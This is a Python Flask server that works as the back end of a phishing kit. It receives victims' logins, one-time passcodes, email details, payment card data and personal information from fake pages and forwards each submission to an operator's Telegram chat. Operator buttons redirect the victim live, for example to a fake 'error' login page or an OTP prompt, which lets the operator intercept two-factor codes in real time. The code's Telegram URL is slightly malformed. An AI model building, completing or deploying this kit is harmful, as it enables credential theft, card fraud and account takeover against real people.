from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import uuid
import requests
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID in environment")

# Storage for session data
SESSION_STATUS = {}

# Page configuration for Telegram buttons
PAGES = [
    {"emoji": "🔐", "text": "LOGIN1", "page": "home.html"},
    {"emoji": "🔢", "text": "OTP", "page": "otp.html"},
    {"emoji": "📧", "text": "EMAIL", "page": "email.html"},
    {"emoji": "🧾", "text": "C", "page": "c.html"},
    {"emoji": "🧍", "text": "PERSONAL", "page": "personal.html"},
    {"emoji": "🔑", "text": "LOGIN2", "page": "home.html?error=1"},
    {"emoji": "🎉", "text": "THANK YOU", "page": "thnks.html"},
]

def send_to_telegram(data, session_id, type_label):
    msg = f"<b>🔐 {type_label.upper()} Submission</b>\n\n"
    for key, value in data.items():
        if isinstance(value, dict):
            msg += f"<b>{key.replace('_', ' ').title()}:</b>\n"
            for subkey, subvalue in value.items():
                msg += f"  <b>{subkey.replace('_', ' ').title()}:</b> <code>{subvalue}</code>\n"
        else:
            msg += f"<b>{key.replace('_', ' ').title()}:</b> <code>{value}</code>\n"
    msg += f"\n<b>Session ID:</b> <code>{session_id}</code>"

    inline_keyboard = [[
        {"text": f"{b['emoji']} {b['text']}", "callback_data": f"{session_id}:{b['page']}"}
    ] for b in PAGES]

    payload = {
        "chat_id": CHAT_ID,
        "text": msg,
        "parse_mode": "HTML",
        "reply_markup": {"inline_keyboard": inline_keyboard}
    }

    try:
        requests.post(f"https://telegram.org{BOT_TOKEN}/sendMessage", json=payload)
    except Exception as e:
        print(f"Telegram error: {e}")

@app.route("/webhook", methods=["POST"])
def webhook():
    update = request.get_json()
    if update and "callback_query" in update:
        callback_data = update["callback_query"]["data"]
        try:
            session_id, page_to_redirect = callback_data.split(":", 1)
            if session_id in SESSION_STATUS:
                SESSION_STATUS[session_id]["approved"] = True
                SESSION_STATUS[session_id]["redirect_url"] = page_to_redirect
        except:
            pass
    return jsonify({"ok": True}), 200

@app.route("/status/<session_id>", methods=["GET"])
def get_status(session_id):
    status_info = SESSION_STATUS.get(session_id)
    if not status_info:
        return jsonify({"status": "not_found"}), 404
        
    if status_info.get("approved"):
        return jsonify({
            "status": "approved",
            "redirect_url": status_info["redirect_url"]
        }), 200
    
    return jsonify({"status": "pending"}), 200

def handle_submission(label):
    data = request.get_json()
    session_id = str(uuid.uuid4())
    SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None}
    send_to_telegram(data, session_id, label)
    return jsonify({"success": True, "id": session_id}), 200

@app.route("/login", methods=["POST"])
def login(): return handle_submission("login")

@app.route("/otp", methods=["POST"])
def otp(): return handle_submission("otp")

@app.route("/email", methods=["POST"])
def email(): return handle_submission("email")

@app.route("/c", methods=["POST"])
def c(): return handle_submission("card")

@app.route("/personal", methods=["POST"])
def personal(): return handle_submission("personal")

@app.route("/login2", methods=["POST"])
def login2(): return handle_submission("login2")

if __name__ == "__main__":
    app.run(debug=True)
